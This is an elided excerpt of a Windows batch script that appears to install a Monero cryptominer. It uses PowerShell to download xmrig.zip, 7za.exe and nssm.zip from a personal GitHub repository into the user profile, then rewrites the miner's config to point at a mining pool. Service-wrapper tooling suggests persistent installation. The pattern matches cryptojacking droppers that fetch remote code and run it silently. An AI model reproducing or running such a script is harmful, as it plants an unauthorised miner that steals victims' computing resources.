...
powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/aliyajeba5/abc/main/xmrig.zip', '%USERPROFILE%\xmrig.zip')"
if errorlevel 1 (
...
if errorlevel 1 (
  ...
  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/aliyajeba5/abc/main/7za.exe', '%USERPROFILE%\7za.exe')"
  if errorlevel 1 (
...
powershell -Command "$out = cat '%USERPROFILE%\c3pool\config.json' | %%{$_ -replace '\"url\": *\".*\",', '\"url\": \"xmr.xmring.com:%PORT%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\c3pool\config.json'" 
...
powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/aliyajeba5/abc/main/nssm.zip', '%USERPROFILE%\nssm.zip')"
if errorlevel 1 (
